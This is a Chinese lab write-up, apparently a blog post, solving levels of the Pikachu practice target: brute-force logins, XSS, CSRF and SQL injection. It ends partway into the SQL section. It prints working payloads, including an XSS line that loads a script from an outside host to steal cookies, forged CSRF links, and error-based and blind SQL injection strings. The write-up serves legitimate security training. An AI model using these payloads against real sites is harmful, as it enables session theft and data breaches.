{"title":"Pikachu靶场实操","uid":"a42e284740da93607374cf9810c61f9e","slug":"Pikachu靶场实操","date":"2024-02-04T01:57:16.000Z","updated":"2024-04-21T12:46:40.163Z","comments":true,"path":"api/articles/Pikachu靶场实操.json","keywords":null,"cover":[],"content":"<h1 id=\"Pikachu靶场实操\"><a href=\"#Pikachu靶场实操\" class=\"headerlink\" title=\"Pikachu靶场实操\"></a>Pikachu靶场实操</h1><h2 id=\"暴力破解\"><a href=\"#暴力破解\" class=\"headerlink\" title=\"暴力破解\"></a>暴力破解</h2><h3 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h3><p>连续性尝试+字典+自动化</p>\n<h4 id=\"字典\"><a href=\"#字典\" class=\"headerlink\" title=\"字典\"></a>字典</h4><ul>\n<li>常用的账号密码</li>\n<li>社工库</li>\n<li>算法生成</li>\n</ul>\n<h4 id=\"暴力破解漏洞\"><a href=\"#暴力破解漏洞\" class=\"headerlink\" title=\"暴力破解漏洞\"></a>暴力破解漏洞</h4><ul>\n<li>是否要求复杂密码</li>\n<li>是否使用安全的验证码</li>\n<li>是否进行次数限制</li>\n<li>是否采用双元素认证</li>\n</ul>\n<h4 id=\"验证码\"><a href=\"#验证码\" class=\"headerlink\" title=\"验证码\"></a>验证码</h4><ul>\n<li>防止登录暴力破解</li>\n<li>防止机器恶意注册</li>\n</ul>\n<h4 id=\"测试流程\"><a href=\"#测试流程\" class=\"headerlink\" title=\"测试流程\"></a>测试流程</h4><ul>\n<li>确认登录接口的脆弱性<ul>\n<li>比如:尝试登录–抓包–观察验证元素和response信息</li>\n</ul>\n</li>\n<li>对字典进行优化<ul>\n<li>根据注册提示信息进行优化</li>\n<li>管理员</li>\n</ul>\n</li>\n<li>工具自动化操作</li>\n</ul>\n<h3 id=\"Pikachu关卡\"><a href=\"#Pikachu关卡\" class=\"headerlink\" title=\"Pikachu关卡\"></a>Pikachu关卡</h3><h4 id=\"基于表单的暴力破解\"><a href=\"#基于表单的暴力破解\" class=\"headerlink\" title=\"基于表单的暴力破解\"></a>基于表单的暴力破解</h4><p>此关没有设置验证码等防范措施, 使用Brup Suite的Intruder功能, 如果response中没有<code>username or password is not exists</code>可以说明破解成功</p>\n<p>步骤:</p>\n<ol>\n<li>尝试手动提交表单, 使用brupsuite拦截<br><img src=\"https://i0.imgs.ovh/2024/02/03/bSOeR.png\"></li>\n<li>发送到Intruder, 关闭拦截, 配置好payload和字典, 开始进行破解(Cluster bomb)</li>\n<li>对结果按照长度或有无<code>username or password is not exists</code>进行整理, 发现test&#x2F;abc123和admin&#x2F;123456可能是正确的, 验证后,可以确认破解成功<br><img src=\"https://i0.imgs.ovh/2024/02/03/bSdpW.png\"></li>\n</ol>\n<h4 id=\"验证码绕过-on-server\"><a href=\"#验证码绕过-on-server\" class=\"headerlink\" title=\"验证码绕过(on server)\"></a>验证码绕过(on server)</h4><p>验证码在后端会进行验证, 但是验证码可以被重复利用, 因此可以手动输入正确的验证码, 然后一直利用该验证码进行破解, 其余操作同上</p>\n<p><img src=\"https://i0.imgs.ovh/2024/02/03/bSD8e.png\"></p>\n<ul>\n<li><em>原因: php中 session默认的过期时间为1440秒, 后端没有对此进行设置, 因此这段时间内验证码可以一直用</em></li>\n</ul>\n<h4 id=\"验证码绕过-on-client\"><a href=\"#验证码绕过-on-client\" class=\"headerlink\" title=\"验证码绕过(on client)\"></a>验证码绕过(on client)</h4><p>验证码只能在前端限制客户端发包, 非常容易解除, 没有很好的验证效果, 其余操作同上</p>\n<h4 id=\"token防爆破\"><a href=\"#token防爆破\" class=\"headerlink\" title=\"token防爆破\"></a>token防爆破</h4><p>由于token已经出现在前端代码中, 因此我们可以轻易获取, 我先猜测用户名为admin, 然后通过音叉模式结合字典和从响应中获取的token进行暴破</p>\n<p><img src=\"https://i0.imgs.ovh/2024/02/03/buV7s.png\"></p>\n<h2 id=\"XSS跨站脚本\"><a href=\"#XSS跨站脚本\" class=\"headerlink\" title=\"XSS跨站脚本\"></a>XSS跨站脚本</h2><h3 id=\"概述-1\"><a href=\"#概述-1\" class=\"headerlink\" title=\"概述\"></a>概述</h3><h4 id=\"测试流程-1\"><a href=\"#测试流程-1\" class=\"headerlink\" title=\"测试流程\"></a>测试流程</h4><ol>\n<li>在目标站点上找到输入点, 比如查询接口, 留言板等</li>\n<li>输入一组“特殊字符+唯一识别字符”，点击提交后,查看返回的源码，是否有做对应的处理</li>\n<li>通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);</li>\n<li>提交构造的脚本代码(以及各种绕过姿势)，看是否可以成功执行，如果成功执行则说明存在XSS漏洞;</li>\n</ol>\n<h4 id=\"tips\"><a href=\"#tips\" class=\"headerlink\" title=\"tips\"></a>tips</h4><ol>\n<li>一般查询接口容易出现反射型XSS，留言板容易出现存储型XSS</li>\n<li>由于后台可能存在过滤措施,构造的script可能会被过滤掉，而无法生效,或者环境限制了执行(浏览器);</li>\n<li>通过变化不同的script，尝试绕过后台过滤机制;</li>\n</ol>\n<h4 id=\"反射型xss-GET与POST\"><a href=\"#反射型xss-GET与POST\" class=\"headerlink\" title=\"反射型xss(GET与POST)\"></a>反射型xss(GET与POST)</h4><ul>\n<li>GET型可以用伪装后的url, 更容易攻击</li>\n</ul>\n<h4 id=\"XSS绕过\"><a href=\"#XSS绕过\" class=\"headerlink\" title=\"XSS绕过\"></a>XSS绕过</h4><ul>\n<li>转换<ul>\n<li>大小写<code>&lt;ScRipT&gt;</code></li>\n<li>拼凑<code>&lt;scr&lt;script&gt;ipt&gt;</code></li>\n<li>注释<code>&lt;sc&lt;!--a--&gt;ript&gt;</code></li>\n</ul>\n</li>\n<li>编码<ul>\n<li>url编码</li>\n<li>html编码</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"htmlspecialchars-函数\"><a href=\"#htmlspecialchars-函数\" class=\"headerlink\" title=\"htmlspecialchars()函数\"></a>htmlspecialchars()函数</h4><p>htmlspecialchars()函数把预定义的字符转换为HTML实体。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>&amp;(和号)成为&amp;amp<br>“(双引号)成为&amp;quot<br>‘(单引号)成为&amp;#039<br>&lt;(小于)成为&amp;lt<br>‘&gt;’(大于)成为&amp;gt</p></blockquote>\n<h3 id=\"Pikachu关卡-1\"><a href=\"#Pikachu关卡-1\" class=\"headerlink\" title=\"Pikachu关卡\"></a>Pikachu关卡</h3><h4 id=\"反射型xss-get\"><a href=\"#反射型xss-get\" class=\"headerlink\" title=\"反射型xss(get)\"></a>反射型xss(get)</h4><div class=\"language-php\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">php</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">html</span><span style=\"color: #89DDFF\">.=&quot;</span><span style=\"color: #C3E88D\">&lt;p class=&#39;notice&#39;&gt;who is </span><span style=\"color: #89DDFF\">&#123;$</span><span style=\"color: #BABED8\">_GET</span><span style=\"color: #89DDFF\">[&#39;</span><span style=\"color: #C3E88D\">message</span><span style=\"color: #89DDFF\">&#39;]&#125;</span><span style=\"color: #C3E88D\">,i don&#39;t care!&lt;/p&gt;</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">;</span></span></code></pre></div><p>源码没有对message进行任何检查和过滤</p>\n<p>解除前端输入限制后输入<code>&lt;/p&gt;&lt;script&gt;alert();&lt;/script&gt;&lt;p&gt;</code>即可</p>\n<p><img src=\"https://i0.imgs.ovh/2024/02/03/bxp1J.png\"></p>\n<h4 id=\"反射型xss-post\"><a href=\"#反射型xss-post\" class=\"headerlink\" title=\"反射型xss(post)\"></a>反射型xss(post)</h4><p>一次性,会与服务端交互,输入<code>&lt;/p&gt;&lt;sCRiPt sRC=//uj.ci/pq7&gt;&lt;/sCrIpT&gt;&lt;p&gt;</code>成功打到cookie<br><img src=\"https://i0.imgs.ovh/2024/02/03/bxwvW.png\"></p>\n<h4 id=\"存储型xss\"><a href=\"#存储型xss\" class=\"headerlink\" title=\"存储型xss\"></a>存储型xss</h4><p>同样没有检查和过滤, 每次刷新都会加载一遍, 输入同上<br><img src=\"https://i0.imgs.ovh/2024/02/03/bxsBo.png\"></p>\n<h4 id=\"DOM型xss\"><a href=\"#DOM型xss\" class=\"headerlink\" title=\"DOM型xss\"></a>DOM型xss</h4><p>输入的内容会被填入超链接<br>输入<code>&#39; onclick=&#39;alert()</code>然后点击超链接链接:<br><img src=\"https://i0.imgs.ovh/2024/02/03/bxKv5.png\"></p>\n<h4 id=\"DOM型xss-x\"><a href=\"#DOM型xss-x\" class=\"headerlink\" title=\"DOM型xss-x\"></a>DOM型xss-x</h4><p>输入内容同上, 点击第二个出现的超链接运行, 类似于get反射型xss, 可以通过url攻击<br><img src=\"https://i0.imgs.ovh/2024/02/03/bx1yp.png\"></p>\n<h4 id=\"xss之盲打\"><a href=\"#xss之盲打\" class=\"headerlink\" title=\"xss之盲打\"></a>xss之盲打</h4><p>我留言的内容在后台显示到管理员界面, 因此输入<code>&lt;/td&gt;&lt;script&gt;alert();&lt;/script&gt;&lt;td&gt;</code>, 管理员进入后台后就会被弹窗<br><img src=\"https://i0.imgs.ovh/2024/02/03/bx5oK.png\"></p>\n<h4 id=\"xss之过滤\"><a href=\"#xss之过滤\" class=\"headerlink\" title=\"xss之过滤\"></a>xss之过滤</h4><p><code>&lt;script</code>会被过滤掉, 但是换成大写就不会, 比如<code>&lt;ScriPt&gt;alert();&lt;/SCripT&gt;</code><br><img src=\"https://i0.imgs.ovh/2024/02/03/bxYY2.png\" alt=\"https://i0.imgs.ovh/2024/02/03/bxYY2.png\"></p>\n<h4 id=\"xss之htmlspecialchars\"><a href=\"#xss之htmlspecialchars\" class=\"headerlink\" title=\"xss之htmlspecialchars\"></a>xss之htmlspecialchars</h4><p>单引号<code>&#39;</code>没有被处理, 因此可以输入<code>#&#39; onclick=alert();&#39;</code><br><img src=\"https://i0.imgs.ovh/2024/02/04/beYBl.png\"></p>\n<h4 id=\"xss之herf输出\"><a href=\"#xss之herf输出\" class=\"headerlink\" title=\"xss之herf输出\"></a>xss之herf输出</h4><p>这关没有在后端限制只能输入url因此可以填入js代码<code>javascript:alert()</code><br><img src=\"https://i0.imgs.ovh/2024/02/04/bed1d.png\"></p>\n<h4 id=\"xss之js输出\"><a href=\"#xss之js输出\" class=\"headerlink\" title=\"xss之js输出\"></a>xss之js输出</h4><p>关于输入的源码如下:</p>\n<div class=\"language-html\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">html</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #F07178\">script</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    $ms</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">432</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\">($ms</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #BABED8\">length </span><span style=\"color: #89DDFF\">!=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">        </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #F07178\">(</span><span style=\"color: #BABED8\">$ms</span><span style=\"color: #F07178\"> </span><span style=\"color: #89DDFF\">==</span><span style=\"color: #F07178\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">tmac</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #F07178\">)</span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">            </span><span style=\"color: #82AAFF\">$</span><span style=\"color: #F07178\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">#fromjs</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #F07178\">)</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">text</span><span style=\"color: #F07178\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">tmac确实厉害,看那小眼神..</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #F07178\">)</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">        </span><span style=\"color: #89DDFF\">&#125;</span><span style=\"color: #89DDFF; font-style: italic\">else</span><span style=\"color: #F07178\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">//            alert($ms);</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">            </span><span style=\"color: #82AAFF\">$</span><span style=\"color: #F07178\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">#fromjs</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #F07178\">)</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">text</span><span style=\"color: #F07178\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">无论如何不要放弃心中所爱..</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #F07178\">)</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">        </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F07178\">    </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;/</span><span style=\"color: #F07178\">script</span><span style=\"color: #89DDFF\">&gt;</span></span></code></pre></div><p>可以在<code>$ms=&#39;432&#39;</code>构造闭合, 输入<code>tmac&#39;&lt;/script&gt;&lt;script&gt;alert();&lt;/script&gt;</code><br><img src=\"https://i0.imgs.ovh/2024/02/04/beEf2.png\"></p>\n<h2 id=\"CSRF-跨站请求伪造\"><a href=\"#CSRF-跨站请求伪造\" class=\"headerlink\" title=\"CSRF(跨站请求伪造)\"></a>CSRF(跨站请求伪造)</h2><h3 id=\"概述-2\"><a href=\"#概述-2\" class=\"headerlink\" title=\"概述\"></a>概述</h3><ul>\n<li>通过伪装来自受信任用户的请求来利用受信任的网站</li>\n</ul>\n<h4 id=\"与XSS的区别\"><a href=\"#与XSS的区别\" class=\"headerlink\" title=\"与XSS的区别\"></a>与XSS的区别</h4><ul>\n<li>XSS可以拿到用户的权限(盗取cookie), 然后实施破坏</li>\n<li>CSRF借用户的权限进行攻击, 而没有拿到用户的权限</li>\n</ul>\n<h4 id=\"确认是否存在CSRF漏洞\"><a href=\"#确认是否存在CSRF漏洞\" class=\"headerlink\" title=\"确认是否存在CSRF漏洞\"></a>确认是否存在CSRF漏洞</h4><ul>\n<li>判断请求是否可以被伪造</li>\n<li>确认凭证的有效期</li>\n</ul>\n<h4 id=\"Token如何防止CDRF\"><a href=\"#Token如何防止CDRF\" class=\"headerlink\" title=\"Token如何防止CDRF\"></a>Token如何防止CDRF</h4><ul>\n<li>每次请求增加一个随机码, 后台每次对次进行验证</li>\n</ul>\n<h3 id=\"Pikachu关卡-2\"><a href=\"#Pikachu关卡-2\" class=\"headerlink\" title=\"Pikachu关卡\"></a>Pikachu关卡</h3><h4 id=\"CSRF-get\"><a href=\"#CSRF-get\" class=\"headerlink\" title=\"CSRF(get)\"></a>CSRF(get)</h4><ul>\n<li><p>假设攻击者是Allen, 可以得到修改信息提交表单时的url为<code>http://192.168.1.9:7071/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=13676767767&amp;add=nba+767&amp;email=allen%40pikachu.com&amp;submit=submit</code></p>\n</li>\n<li><p>假设攻击目标是vince, 已知他目前的个人信息为:</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>姓名:vince</p>\n<p>性别:boy</p>\n<p>手机:18626545453</p>\n<p>住址:chain</p>\n<p>邮箱:<a href=\"mailto:&#x76;&#105;&#x6e;&#99;&#101;&#x40;&#x70;&#x69;&#x6b;&#97;&#x63;&#x68;&#x75;&#x2e;&#x63;&#111;&#x6d;\">&#x76;&#105;&#x6e;&#99;&#101;&#x40;&#x70;&#x69;&#x6b;&#97;&#x63;&#x68;&#x75;&#x2e;&#x63;&#111;&#x6d;</a></p></blockquote>\n</li>\n<li><p>要把他的个人信息中的地址修改为<code>moon</code>, 那么可以伪造一个链接<code>http://192.168.1.9:7071/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=18626545453&amp;add=moon&amp;email=vince%40pikachu.com&amp;submit=submit</code></p>\n</li>\n<li><p>让vince点击这个链接, 就可以利用vince的权限, 向web发出请求, 修改个人信息<br><img src=\"https://i0.imgs.ovh/2024/02/04/bgpJU.png\"></p>\n</li>\n</ul>\n<h4 id=\"CSRF-post\"><a href=\"#CSRF-post\" class=\"headerlink\" title=\"CSRF(post)\"></a>CSRF(post)</h4><ul>\n<li>post请求中, 表单不在url中, 而在请求体中, 这时可以伪造一个站点, 让vince给伪造站点发出请求, 把请求中的参数进行修改, 向真正的站点提交post请求</li>\n<li>在伪造站点(钓鱼网站)中, 我在表单添加一个action, 让表单提交到真正的网站上<code>&lt;form actiom=&quot;http://192.168.1.9:7071/vul/csrf/csrfpost/csrf_post_edit.php&quot; method=&quot;post&quot;&gt;</code></li>\n<li>在vince点击提交时, 将vince的信息进行修改, 即可达成目的<br><img src=\"https://i0.imgs.ovh/2024/02/04/bgpJU.png\"></li>\n</ul>\n<h4 id=\"CSRF-Token\"><a href=\"#CSRF-Token\" class=\"headerlink\" title=\"CSRF Token\"></a>CSRF Token</h4><h2 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h2><h3 id=\"概述-3\"><a href=\"#概述-3\" class=\"headerlink\" title=\"概述\"></a>概述</h3><ul>\n<li><p>攻击者可以通过合法输入点提交一些精心构造的语句, 从而欺骗后台数据库对其进行执行, 导致数据库信息泄露</p>\n</li>\n<li><p>例如:<br>正常输入: <code>1</code>, 执行<code>select password from users where id=1</code><br>非法输入:<code>1 or 1=1</code>, 执行<code>select password from users where id=1 or 1=1;</code><br>后者会输出表中的所有password</p>\n</li>\n</ul>\n<h4 id=\"攻击流程\"><a href=\"#攻击流程\" class=\"headerlink\" title=\"攻击流程\"></a>攻击流程</h4><ol>\n<li><p>注入点探测(自动&#x2F;手动)</p>\n<ul>\n<li>判断注入点类型</li>\n<li>判断查询列数</li>\n<li>判断显示位置</li>\n</ul>\n</li>\n<li><p>信息获取</p>\n<ul>\n<li><p>获取所有数据库名</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>一次性显示全部:group_concat(字段名)</p>\n<p>逐一显示: limit</p></blockquote>\n</li>\n<li><p>获取某数据库所有表名</p>\n</li>\n<li><p>获取某库某表中所有字段名</p>\n</li>\n<li><p>获取字段的数据</p>\n</li>\n</ul>\n</li>\n<li><p>获取权限</p>\n</li>\n</ol>\n<h4 id=\"注入点类型\"><a href=\"#注入点类型\" class=\"headerlink\" title=\"注入点类型\"></a>注入点类型</h4><ul>\n<li>数字型</li>\n<li>字符型: <code>&#39;xxx&#39;</code></li>\n<li>搜索型: <code>%xxx%</code></li>\n</ul>\n<p><em>根据类型进行构造闭合</em></p>\n<h4 id=\"基于union联合查询的信息获取\"><a href=\"#基于union联合查询的信息获取\" class=\"headerlink\" title=\"基于union联合查询的信息获取\"></a>基于union联合查询的信息获取</h4><ul>\n<li>查询列数必须相同</li>\n</ul>\n<h4 id=\"判断查询列数\"><a href=\"#判断查询列数\" class=\"headerlink\" title=\"判断查询列数\"></a>判断查询列数</h4><ul>\n<li>order by: 按照指定字段名进行排序</li>\n</ul>\n<h4 id=\"基于报错信息获取\"><a href=\"#基于报错信息获取\" class=\"headerlink\" title=\"基于报错信息获取\"></a>基于报错信息获取</h4><ul>\n<li>使用一些指定的函数来制造报错, 从报错信息中获取特定的信息</li>\n<li>背景条件: 后台没有屏蔽报错信息, 在语法发生错误时会输出在前端</li>\n</ul>\n<h5 id=\"报错函数\"><a href=\"#报错函数\" class=\"headerlink\" title=\"报错函数\"></a>报错函数</h5><ul>\n<li><p><code>updatexml()</code></p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">updatexml(xml_document, XPathstring, new_value)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">#第一个参数: 表中的字段名(字符串)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">#第二个参数:Xpath格式的字符串</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">#String格式，替换查找到的符合条件的</span></span></code></pre></div><p>**”XPath定位必须是有效的, 否则会发送错误”**可以利用这一点制造报错信</p>\n<p>例如<code>updatexml(1,concat(0x7e,database(),0))</code>会产生报错信息, 其中有<code>database()</code>执行的结果</p>\n</li>\n<li><p><code>extractvalue()</code></p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">extractvalue(xml_document, xpath_string)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">#同样通过xpath产生报错</span></span></code></pre></div></li>\n<li><p><code>floor()</code><br>取整函数, 示例:</p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">xxx</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\"> and (select 2 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"盲注\"><a href=\"#盲注\" class=\"headerlink\" title=\"盲注\"></a>盲注</h4><ul>\n<li>后台屏蔽了报错信息, 无法根据报错进行注入的判断  </li>\n<li>分类<ul>\n<li>基于真假, 例:<code>vince&#39; and ascii(substr(database(),1,1))=112#</code></li>\n<li>基于时间, 例:<code>vince&#39; and if((ascii(substr(database(),1,1)))=112,sleep(5),null)#</code></li>\n</ul>\n</li>\n<li>通过<code>ascii(substr((xx语句), n, n))=x</code>判断</li>\n</ul>\n<h4 id=\"宽字节注入\"><a href=\"#宽字节注入\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h4><h3 id=\"Pikachu关卡-3\"><a href=\"#Pikachu关卡-3\" class=\"headerlink\" 